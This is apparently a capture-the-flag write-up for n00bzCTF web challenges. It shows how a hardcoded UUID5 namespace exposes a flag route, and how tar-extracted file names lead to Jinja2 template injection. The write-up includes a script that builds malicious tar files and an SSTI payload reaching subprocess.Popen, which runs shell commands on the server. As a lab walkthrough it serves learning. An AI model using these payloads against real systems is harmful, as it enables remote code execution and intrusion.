* * *

### CTF: **n00bzCTF**

* * *

### Challeges

- Web:
  - Passwordless
  - File Sharing Portal

- Crypto:
  - Vinegar

- Rev:
  - Vacation

### Web:

- Passwordless

   ![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)

- Explaining the source code:

        #!/usr/bin/env python3
      from flask import Flask, request, redirect, render_template, render_template_string
      import subprocess
      import urllib
      import uuid
      global leet
      
      app = Flask(__name__)
      flag = open('/flag.txt').read()
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      
      @app.route('/',methods=['GET','POST'])
      def main():
          global username
          if request.method == 'GET':
              return render_template('index.html')
          elif request.method == 'POST':
              username = request.values['username']
              if username == 'admin123':
                  return 'Stop trying to act like you are the admin!'
              uid = uuid.uuid5(leet,username) # super secure!
              return redirect(f'/{uid}')
      
      @app.route('/<uid>')
      def user_page(uid):
          if uid != str(uuid.uuid5(leet,'admin123')):
              return f'Welcome! No flag for you :('
          else:
              return flag
      
      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=1337)

- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is hardocded  and the majin vulnerability.If the uid is added to the route, it reveals the flag.

      #Leet uid
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      if uid != str(uuid.uuid5(leet,'admin123')):
                return f'Welcome! No flag for you :('
            else:
                return flag

- Creating the uid with python `uuid` module

        ❯ python3
      Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
      Type "help", "copyright", "credits" or "license" for more information.
      >>> import uuid
      >>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      >>> str(uuid.uuid5(leet,'admin123'))
      '3c68e6cc-15a7-59d4-823c-e7563bbb326c'
      >>> 

- Grabbing the flag with curl

         ❯ curl http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c
      n00bz{1337-13371337-1337-133713371337-1337}


### File Sharing Portal

 ![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)

### Source Code Analysis/

- The index page `/` accepts upload of only tarfiles, removes the name  and replace it with a sha256 generated hash of a random value,the server uses the `tarfile` module to extract the file,places it in a directory named after the name hash and creates an hyperlink to access the extracted files.

      elif request.method == 'POST':
            file = request.files['file']
            if file.filename[-4:] != '.tar':
                return render_template_string("<p> We only support tar files as of right now!</p>")
            name = sha256(os.urandom(16)).digest().hex()
            os.makedirs(f"./uploads/{name}", exist_ok=True)
            file.save(f"./uploads/{name}/{name}.tar")
            try:
                tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
                tar_file.extractall(path=f'./uploads/{name}/')
                return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")

- The `/view/<name` checks if all the characters are within the range `a-f0-9` and if it appears otherwise, it triggers an error.Then, it uses `os.listdir()` to list the directory of the extracted tar file which is stored in a `list`.Then, it uses this `f'<a href="/read/{name}/{i}">{i}</a>'` line to create an hyperlink to each extracted files. The server uses the function `render_template_string()` to render the html code.Although, the function  is vulnerable to SSTI injection which allows us execute python code on the server. The code executes the name of the extracted file because the server doesn't convert it into a hash.


       if not all([i in "abcdef1234567890" for i in name]):
            return render_template_string("<p>Error!</p>")
            #print(os.popen(f'ls ./uploads/{name}').read())
                #print(name)
        files = os.listdir(f"./uploads/{name}")
        out = '<h1>Files</h1><br>'
        files.remove(f'{name}.tar')  # Remove the tar file from the list
        for i in files:
            out += f'<a href="/read/{name}/{i}">{i}</a>'
           # except:
        return render_template_string(out)

### Proof of concept writing 

- I wrote a python script that stores the payload with  `input()` and creates a file with the payload's name.Then, a tarfile named `zip.tar` is created with module `tarfile` and the payload named file is added to it.

- Code:
      
      #! /usr/bin/env python3
      import tarfile
      
      def exploit(string: str):
          file = open(string,"w")
          file.close()
          #tarfile+ssti exploit
          tarfilez = tarfile.open("{{7*7}}.tar","w")
          tarfilez.add(string)
          tarfilez.close()
          print("[+]zip.tar created")
      
      def main():
          while True:
                 ssti_string = input("[+]Enter ssti string: ")
                 exploit(ssti_string)
      
      if __name__ == "__main__":
         main()

- Creating the `tarfile`

  ![image](https://github.com/user-attachments/assets/42725d11-9e19-4c1a-bb82-3220e3a0406c)

- Uploading the tar file shows it works, here is the result of `{{config}}`

  ![image](https://github.com/user-attachments/assets/2aeca84b-8d71-4392-a868-e2f5382fef82)

### RCE

- I got command execution with this payload `{{"".__class__.__base__.__subclasses__()[351]}}`, now we can execute shell commands with `class subprocess.Popen`.

   ![image](https://github.com/user-attachments/assets/889412d1-1e9f-41f9-9f3f-07763f68100f)

### Reading the flag

- I read the flag with this payload `{{"".__class__.__base__.__subclasses__()[351]("cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt",shell=True,stdout=-1).communicate()}}`

  ![image](https://github.com/user-attachments/assets/68a287da-fea8-4b00-bd10-3053431c05f1)

- Flag with curl:

        ❯ curl http://f94014e3-dcf1-4cf2-8cc3-3a72ec904122.challs.n00bzunit3d.xyz:8080/view/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0
      <h1>Files</h1><br><a href="/read/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0/(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)">(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)</a>% 
      
      
        


  
 
